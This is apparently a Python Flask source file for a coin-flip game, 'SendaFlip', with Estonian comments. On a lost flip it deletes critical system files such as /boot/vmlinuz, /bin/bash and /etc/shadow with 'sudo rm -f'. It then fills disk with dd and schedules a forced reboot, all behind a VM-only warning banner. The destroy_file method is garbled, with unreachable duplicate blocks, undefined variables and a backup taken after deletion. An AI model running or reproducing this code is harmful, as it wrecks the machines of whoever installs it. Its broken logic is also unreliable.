import os
import random
import subprocess
import sys
from flask import Flask, render_template, request, jsonify
from datetime import datetime

app = Flask(__name__)

# KRITIILISED FAILID
CRITICAL_FILES = {
    "linux_kernel": [
        "/boot/vmlinuz",
        "/boot/initrd.img",
        "/boot/grub/grub.cfg",
    ],
    "system_binaries": [
        "/bin/bash",
        "/bin/sh",
        "/usr/bin/sudo",
    ],
    "system_configs": [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/fstab",
    ]
}

BACKUP_TARGETS = [
    "/tmp/critical_boot_backup",
    "/home/kasutaja/critical_files/",
    os.path.expanduser("~/sendaflip_danger_zone/")
]

class SystemDestroyer:
    def __init__(self):
        self.destruction_log = "system_destruction.log"
        self.os_type = self.detect_os()
        self.create_backup_warning()
        
    def detect_os(self):
        if sys.platform == "linux":
            try:
                with open("/etc/os-release", "r") as f:
                    content = f.read()
                    if "ubuntu" in content.lower():
                        return "ubuntu"
                    elif "debian" in content.lower():
                        return "debian"
                    else:
                        return "linux_unknown"
            except:
                return "linux"
        elif sys.platform == "win32":
            return "windows"
        else:
            return "unknown"
    
    def create_backup_warning(self):
        warning = f"""
        âš ï¸ SENDAFLIP REAL DANGER MODE âš ï¸
        
        System: {self.os_type}
        Time: {datetime.now()}
        
        WARNING: This WILL DELETE critical system files!
        """
        print(warning)
        with open("DANGER_WARNING.txt", "w") as f:
            f.write(warning)
    
    def find_deletable_file(self):
        for category, files in CRITICAL_FILES.items():
            for file_path in files:
                if os.path.exists(file_path):
                    if os.access(file_path, os.W_OK) or os.access(os.path.dirname(file_path), os.W_OK):
                        return file_path, category
        
        for target_dir in BACKUP_TARGETS:
            test_file = os.path.join(target_dir, "critical_test.txt")
            try:
                os.makedirs(target_dir, exist_ok=True)
                with open(test_file, "w") as f:
                    f.write("Test file for SendaFlip danger mode")
                return test_file, "backup_target"
            except:
                continue
        
        return None, None
    
    def destroy_file(self, file_path):
        """Kustuta fail - kasuta sudo'd ALATI sÃ¼steemifailide jaoks"""
        import subprocess
        from datetime import datetime
        
        print(f"ğŸ’£ ATTEMPTING TO DELETE: {file_path}")
        
        # Kontrolli, kas on sÃ¼steemifail
        is_system_file = any(path in file_path for path in 
                           ["/boot/", "/etc/", "/bin/", "/sbin/", "/usr/bin/", "/usr/sbin/"])
        
        if is_system_file:
            print(f"ğŸš¨ SYSTEM FILE DETECTED: {file_path}")
            print(f"ğŸš¨ USING SUDO FOR DELETION...")
            
            # 1. Proovi sudo'ga kustutada KOHE
            delete_cmd = f"sudo rm -f '{file_path}'"
            print(f"ğŸ”§ Running: {delete_cmd}")
            
            result = subprocess.run(delete_cmd, shell=True, 
                                  capture_output=True, text=True)
            
            if result.returncode == 0:
                # 2. Tee backup PÃ„RAST kustutamist (kui vÃµimalik)
                backup_cmd = f"sudo cp '{file_path}' '{file_path}.sendaflip_backup' 2>/dev/null || echo 'Backup failed'"
                subprocess.run(backup_cmd, shell=True)
                
                # 3. Logi
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                with open(self.destruction_log, "a") as f:
                    f.write(f"[{timestamp}] DELETED WITH SUDO: {file_path}\n")
                
                return {
                    "success": True,
                    "action": "deleted_with_sudo",
                    "file": file_path,
                    "message": f"ğŸ’¥ğŸ’¥ğŸ’¥ SYSTEM FILE DELETED WITH SUDO: {file_path}",
                    "command_used": delete_cmd
                }
            else:
                # 4. Kui sudo ei tÃ¶Ã¶ta, proovi otse kÃ¤suga
                print(f"âš ï¸ Sudo failed, trying direct command...")
                force_cmd = f"rm -f '{file_path}'"
                subprocess.run(force_cmd, shell=True)
                
                # Kontrolli, kas fail on ikka olemas
                if not os.path.exists(file_path):
                    return {
                        "success": True,
                        "action": "deleted_direct",
                        "file": file_path,
                        "message": f"ğŸ’¥ FILE DELETED (direct command): {file_path}"
                    }
                else:
                    return {
                        "success": False,
                        "error": result.stderr,
                        "message": f"âŒ FAILED TO DELETE: {file_path}\nError: {result.stderr}"
                    }
        else:
            # Tavalise faili jaoks
            try:
                if os.path.exists(file_path):
                    # Backup
                    backup_path = file_path + ".sendaflip_backup"
                    try:
                        import shutil
                        shutil.copy2(file_path, backup_path)
                    except:
                        pass
                    
                    # Delete
                    os.remove(file_path)
                    
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    with open(self.destruction_log, "a") as f:
                        f.write(f"[{timestamp}] DELETED: {file_path}\n")
                    
                    return {
                        "success": True,
                        "action": "deleted",
                        "file": file_path,
                        "message": f"ğŸ’¥ FILE DELETED: {file_path}"
                    }
                else:
                    return {
                        "success": False,
                        "message": f"File does not exist: {file_path}"
                    }
            except Exception as e:
                return {
                    "success": False,
                    "error": str(e),
                    "message": f"Failed to delete {file_path}: {str(e)}"
                }
                return {
                    "success": True,
                    "action": action,
                    "file": file_path,
                    "backup": backup_path if backup_created else None,
                    "backup_created": backup_created,
                    "message": f"ğŸ’¥ FILE DESTROYED: {file_path}"
                }
            else:
                return {
                    "success": False,
                    "message": f"File does not exist: {file_path}"
                }
                
        except Exception as e:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(self.destruction_log, "a") as f:
                f.write(f"[{timestamp}] ERROR: {str(e)}\n")
            
            return {
                "success": False,
                "error": str(e),
                "message": f"Failed to destroy {file_path}: {str(e)}"
            }
    
    def simulate_system_crash(self):
        crash_effects = []
        
        panic_file = "/tmp/kernel_panic.log"
        with open(panic_file, "w") as f:
            f.write(f"KERNEL PANIC - SendaFlip triggered\n")
            f.write(f"Time: {datetime.now()}\n")
            f.write("System files compromised\n")
        crash_effects.append(f"Created kernel panic log: {panic_file}")
        
        try:
            subprocess.Popen(["dd", "if=/dev/zero", "of=/tmp/fill", "bs=1M", "count=50"], 
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            crash_effects.append("Started memory filler")
        except:
            pass
        
        reboot_script = "/tmp/sendaflip_reboot.sh"
        with open(reboot_script, "w") as f:
            f.write("#!/bin/bash\n")
            f.write(f"# SendaFlip triggered reboot\n")
            f.write("echo 'System will reboot in 60 seconds due to critical file loss'\n")
            f.write("sleep 60\n")
            f.write("reboot\n")
        
        os.chmod(reboot_script, 0o755)
        subprocess.Popen([reboot_script], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        crash_effects.append(f"Scheduled reboot: {reboot_script}")
        
        return crash_effects

@app.route('/')
def index():
    destroyer = SystemDestroyer()
    
    vulnerable_files = []
    for category, files in CRITICAL_FILES.items():
        for f in files:
            if os.path.exists(f):
                vulnerable_files.append(f)
    
    return render_template('index.html', 
                         danger_mode=True,
                         os_type=destroyer.os_type,
                         vulnerable_files=vulnerable_files[:3],
                         warning="REAL DANGER MODE - SYSTEM FILES WILL BE DELETED!")

@app.route('/flip', methods=['POST'])
def flip_coin():
    data = request.json
    user_choice = data.get('choice', 'heads')
    destroyer = SystemDestroyer()
    
    result = random.choice(['heads', 'tails'])
    
    if user_choice == result:
        return jsonify({
            'success': True,
            'result': result,
            'message': 'âœ… VÃ•ITSID! SÃ¼steem on turvaline.',
            'os': destroyer.os_type,
            'danger': False,
            'warning': 'System files are safe... for now'
        })
    else:
        target_file, category = destroyer.find_deletable_file()
        
        if not target_file:
            return jsonify({
                'success': False,
                'result': result,
                'message': 'âŒ KAOTASID! Aga kritiilisi faile ei leitud.',
                'danger': True,
                'error': 'No deletable files found',
                'os': destroyer.os_type
            })
        
        destruction_result = destroyer.destroy_file(target_file)
        crash_effects = destroyer.simulate_system_crash()
        
        if destruction_result['success']:
            if category in ['linux_kernel', 'system_binaries']:
                message = f"ğŸ’¥ğŸ’¥ğŸ’¥ KAOTASID! SYSTEM CRITICAL FILE DELETED! ğŸ’¥ğŸ’¥ğŸ’¥\n"
                message += f"Deleted: {target_file}\n"
                message += f"Category: {category}\n"
                message += f"System may become UNBOOTABLE!"
            else:
                message = f"ğŸ’£ KAOTASID! FILE DESTROYED! ğŸ’£\n"
                message += f"Deleted: {target_file}"
            
            if destruction_result.get('backup_created'):
                message += f"\nâš ï¸ Backup created: {destruction_result['backup']}"
        else:
            message = f"ğŸ’¥ KAOTASID! BUT DESTRUCTION FAILED! ğŸ’¥\n"
            message += f"Error: {destruction_result.get('error', 'Unknown')}"
        
        return jsonify({
            'success': False,
            'result': result,
            'message': message,
            'danger': True,
            'destruction_result': destruction_result,
            'crash_effects': crash_effects,
            'os': destroyer.os_type,
            'category': category,
            'emergency': 'VM SNAPSHOT RECOVERY MAY BE REQUIRED!',
            'reboot_warning': 'System scheduled to reboot in 60 seconds!'
        })

@app.route('/system-check')
def system_check():
    destroyer = SystemDestroyer()
    
    file_status = {}
    for category, files in CRITICAL_FILES.items():
        for f in files:
            exists = os.path.exists(f)
            writable = os.access(f, os.W_OK) if exists else False
            file_status[f] = {
                'exists': exists,
                'writable': writable,
                'category': category
            }
    
    return jsonify({
        'os': destroyer.os_type,
        'critical_files': file_status,
        'danger_level': 'EXTREME',
        'warning': 'Playing will DELETE system files!',
        'backup_advice': 'Take VM snapshot before playing!'
    })

@app.route('/emergency-restore')
def emergency_restore():
    restored = []
    
    for root, dirs, files in os.walk("/"):
        for file in files:
            if file.endswith(".sendaflip_backup"):
                backup_path = os.path.join(root, file)
                original_path = backup_path.replace(".sendaflip_backup", "")
                
                try:
                    import shutil
                    shutil.copy2(backup_path, original_path)
                    restored.append(original_path)
                except Exception as e:
                    pass
    
    try:
        subprocess.run(["pkill", "-f", "sendaflip_reboot"], 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass
    
    return jsonify({
        'restored': restored,
        'message': 'Attempted to restore from backups',
        'advice': 'RESTORE VM SNAPSHOT FOR FULL RECOVERY!'
    })

if __name__ == '__main__':
    destroyer = SystemDestroyer()
    
    print("â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—")
    print("â•‘                  â˜¢ï¸  SENDAFLIP REAL DANGER â˜¢ï¸                â•‘")
    print("â•‘                                                              â•‘")
    print(f"â•‘  OS: {destroyer.os_type:54} â•‘")
    print("â•‘                                                              â•‘")
    print("â•‘  âš ï¸  âš ï¸  âš ï¸  EXTREME DANGER WARNING âš ï¸  âš ï¸  âš ï¸           â•‘")
    print("â•‘                                                              â•‘")
    print("â•‘  THIS WILL DELETE CRITICAL SYSTEM FILES:                     â•‘")
    print("â•‘  â€¢ /boot/vmlinuz      - Linux kernel                         â•‘")
    print("â•‘  â€¢ /bin/bash         - System shell                         â•‘")
    print("â•‘  â€¢ /etc/passwd       - User accounts                        â•‘")
    print("â•‘                                                              â•‘")
    print("â•‘  SYSTEM MAY BECOME UNBOOTABLE!                               â•‘")
    print("â•‘                                                              â•‘")
    print("â•‘  âš¡ REQUIREMENTS:                                             â•‘")
    print("â•‘  1. Virtual Machine (NOT physical!)                          â•‘")
    print("â•‘  2. Fresh VM snapshot before running                         â•‘")
    print("â•‘  3. Understanding that files WILL be deleted                 â•‘")
    print("â•‘                                                              â•‘")
    print("â•‘  Type 'I_ACCEPT_THE_RISK' to continue:                       â•‘")
    print("â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
    
    confirmation = input("> ")
    
    if confirmation.strip() == "I_ACCEPT_THE_RISK":
        print("âœ… Risk accepted! Starting server...")
        print("â³ Server starting on http://0.0.0.0:5000")
        print("ğŸ’€ May the odds be ever in your favor...")
        app.run(debug=True, host='0.0.0.0', port=5000)
    else:
        print("âŒ Risk not accepted. Server not started.")
        print("ğŸ”„ Please restore VM snapshot if any damage occurred.")
        sys.exit(1)
